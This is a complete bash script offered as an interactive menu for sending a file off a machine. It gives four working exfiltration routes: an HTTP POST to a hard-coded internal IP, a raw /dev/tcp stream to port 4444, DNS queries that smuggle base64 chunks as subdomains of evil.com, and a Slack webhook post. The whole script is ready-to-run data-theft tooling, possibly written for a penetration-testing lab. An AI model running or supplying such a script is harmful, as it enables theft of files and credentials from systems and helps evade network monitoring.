#!/bin/bash
# Interactive file exfiltration menu

FILE="$1"

if [[ ! -f "$FILE" ]]; then
    echo "File not found"
    exit 1
fi

echo "Choose exfiltration method:"
echo "1) HTTP POST"
echo "2) Raw TCP"
echo "3) DNS queries"
echo "4) Slack webhook"
read -p "> " CHOICE

case $CHOICE in
    1)
        curl -X POST -F "file=@$FILE" http://10.11.0.123:8000/upload
        ;;
    2)
        exec 3<>/dev/tcp/10.11.0.123/4444
        cat "$FILE" >&3
        exec 3>&-
        ;;
    3)
        for CHUNK in $(cat "$FILE" | base64 | fold -w50); do
            host "$CHUNK.evil.com" > /dev/null
            sleep 1
        done
        ;;
    4)
        TEXT=$(head -n 20 "$FILE")
        curl -X POST -H 'Content-type: application/json' \
          --data "{\"text\":\"$TEXT\"}" https://hooks.slack.com/services/TXXXX/BXXXX/XXXXXX
        ;;
    *)
        echo "Invalid choice"
        ;;
esac
